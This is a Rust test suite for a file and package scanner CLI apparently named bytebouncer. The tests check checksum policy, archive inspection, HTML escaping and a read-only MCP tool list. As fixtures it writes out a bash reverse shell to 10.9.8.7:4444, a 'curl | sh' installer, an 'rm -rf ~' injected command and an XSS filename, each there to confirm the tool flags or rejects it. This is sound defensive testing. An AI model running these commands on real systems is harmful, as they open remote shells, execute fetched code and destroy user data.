//! End-to-end CLI tests. Each test gets its own XDG directories so nothing
//! touches the developer's real report store.

use std::path::PathBuf;
use std::process::{Command, Output};

/// A per-test directory, removed when the test finishes.
struct TempRoot(PathBuf);

impl std::ops::Deref for TempRoot {
    type Target = PathBuf;
    fn deref(&self) -> &PathBuf {
        &self.0
    }
}

impl Drop for TempRoot {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

fn temp_root(name: &str) -> TempRoot {
    let dir = std::env::temp_dir().join(format!("bytebouncer-test-{}-{name}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    TempRoot(dir)
}

fn run(root: &PathBuf, args: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_bytebouncer"))
        .args(args)
        .env("HOME", root)
        .env("XDG_DATA_HOME", root.join("data"))
        .env("XDG_CACHE_HOME", root.join("cache"))
        .output()
        .unwrap()
}

#[test]
fn rejects_malformed_checksum() {
    let root = temp_root("badsum");
    let f = root.join("a.bin");
    std::fs::write(&f, b"x").unwrap();
    let out = run(
        &root,
        &["inspect", f.to_str().unwrap(), "--expect-sha256", "nothex"],
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn rejects_missing_input() {
    let root = temp_root("missing");
    let out = run(&root, &["inspect", root.join("nope").to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn checksum_mismatch_is_critical_and_nonzero() {
    let root = temp_root("mismatch");
    let f = root.join("a.bin");
    std::fs::write(&f, b"hello").unwrap();
    let zeros = "0".repeat(64);
    let out = run(
        &root,
        &[
            "inspect",
            f.to_str().unwrap(),
            "--expect-sha256",
            &zeros,
            "--format",
            "json",
            "--no-save",
            "--allow-reduced-isolation",
        ],
    );
    assert_ne!(out.status.code(), Some(0));
    let report: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(report["policy"]["exceeded"], true);
    assert_eq!(report["findings"][0]["category"], "provenance.mismatch");
    assert_eq!(report["sample_executed"], false);
}

#[test]
fn analyzes_own_binary_and_cleans_workspace() {
    let root = temp_root("self");
    let exe = env!("CARGO_BIN_EXE_bytebouncer");
    let out = run(
        &root,
        &[
            "inspect",
            exe,
            "--format",
            "json",
            "--no-save",
            "--allow-reduced-isolation",
        ],
    );
    let report: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    let format = report["artifacts"][0]["format"].as_str().unwrap();
    if cfg!(target_os = "linux") {
        assert!(format.starts_with("elf-"), "format was {format}");
    }
    assert_eq!(report["cleanup_ok"], true);
    let work = root.join("cache/bytebouncer/work");
    assert_eq!(std::fs::read_dir(work).map(|d| d.count()).unwrap_or(0), 0);
}

fn run_stdin(root: &PathBuf, args: &[&str], stdin: &str) -> Output {
    use std::io::Write;
    let mut child = Command::new(env!("CARGO_BIN_EXE_bytebouncer"))
        .args(args)
        .env("HOME", root)
        .env("XDG_DATA_HOME", root.join("data"))
        .env("XDG_CACHE_HOME", root.join("cache"))
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(stdin.as_bytes())
        .unwrap();
    child.wait_with_output().unwrap()
}

#[test]
fn shell_syntax_and_sudo_are_rejected() {
    let root = temp_root("syntax");
    for target in [
        "sudo pacman -S foo",
        "pacman -S foo; rm -rf ~",
        "pacman -Syu foo",
        "curl x | sh",
    ] {
        let out = run(&root, &["inspect", "--no-save", target]);
        assert_eq!(
            out.status.code(),
            Some(2),
            "{target}: {}",
            String::from_utf8_lossy(&out.stderr)
        );
    }
}

#[cfg(unix)]
#[test]
fn nested_archive_script_is_found_and_fails_policy() {
    let root = temp_root("nested");
    let src = root.join("src");
    std::fs::create_dir_all(&src).unwrap();
    std::fs::write(
        src.join("payload.txt"),
        "bash -i >& /dev/tcp/10.9.8.7/4444 0>&1",
    )
    .unwrap();
    std::fs::write(
        src.join("install.sh"),
        "#!/bin/sh\ncurl -s https://x.example/a | sh\n",
    )
    .unwrap();
    let tgz = root.join("bundle.tar.gz");
    let status = Command::new("tar")
        .arg("czf")
        .arg(&tgz)
        .arg("-C")
        .arg(&src)
        .arg(".")
        .status()
        .unwrap();
    assert!(status.success());
    let out = run(
        &root,
        &[
            "inspect",
            tgz.to_str().unwrap(),
            "--format",
            "json",
            "--no-save",
            "--allow-reduced-isolation",
        ],
    );
    let report: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    let cats: Vec<&str> = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .map(|f| f["category"].as_str().unwrap())
        .collect();
    assert!(cats.contains(&"security.downloader"), "{cats:?}");
    assert!(cats.contains(&"security.capability"), "{cats:?}");
    assert_eq!(report["policy"]["exceeded"], true);
    assert_eq!(out.status.code(), Some(1));
    assert!(
        report["artifacts"]
            .as_array()
            .unwrap()
            .iter()
            .any(|a| a["path"].as_str().unwrap().contains("!"))
    );
}

#[test]
fn html_output_escapes_hostile_names() {
    let root = temp_root("html");
    // Windows file names cannot contain < or >; & and ' still need escaping.
    let (name, escaped, raw) = if cfg!(windows) {
        ("a&b'c.txt", "a&amp;b&#39;c.txt", "a&b'c")
    } else {
        (
            "<img src=x onerror=alert(1)>.txt",
            "&lt;img src=x onerror=alert(1)&gt;",
            "<img",
        )
    };
    let f = root.join(name);
    std::fs::write(&f, "hello").unwrap();
    let out = run(
        &root,
        &[
            "inspect",
            f.to_str().unwrap(),
            "--format",
            "html",
            "--no-save",
            "--allow-reduced-isolation",
        ],
    );
    let html = String::from_utf8_lossy(&out.stdout);
    assert!(html.contains(escaped), "{html}");
    assert!(!html.contains(raw));
    assert!(html.contains("Content-Security-Policy"));
}

#[test]
fn approve_refuses_failed_policy_without_override() {
    let root = temp_root("approve");
    let f = root.join("a.bin");
    std::fs::write(&f, b"x").unwrap();
    let out = run(
        &root,
        &[
            "inspect",
            f.to_str().unwrap(),
            "--expect-sha256",
            &"0".repeat(64),
            "--format",
            "json",
            "--allow-reduced-isolation",
        ],
    );
    let report: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    let id = report["scan_id"].as_str().unwrap();
    let out = run(&root, &["approve", id]);
    assert_ne!(out.status.code(), Some(0));
    let out = run(&root, &["approve", id, "--override", "testing"]);
    assert_eq!(
        out.status.code(),
        Some(0),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
}

#[test]
fn mcp_lists_only_read_only_tools() {
    let root = temp_root("mcp");
    let input = "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"initialize\",\"params\":{}}\n{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/list\"}\n";
    let out = run_stdin(&root, &["mcp"], input);
    let lines: Vec<serde_json::Value> = String::from_utf8_lossy(&out.stdout)
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();
    let names: Vec<&str> = lines[1]["result"]["tools"]
        .as_array()
        .unwrap()
        .iter()
        .map(|t| t["name"].as_str().unwrap())
        .collect();
    assert_eq!(
        names,
        ["inspect", "get_report", "list_reports", "compare_reports"]
    );
}
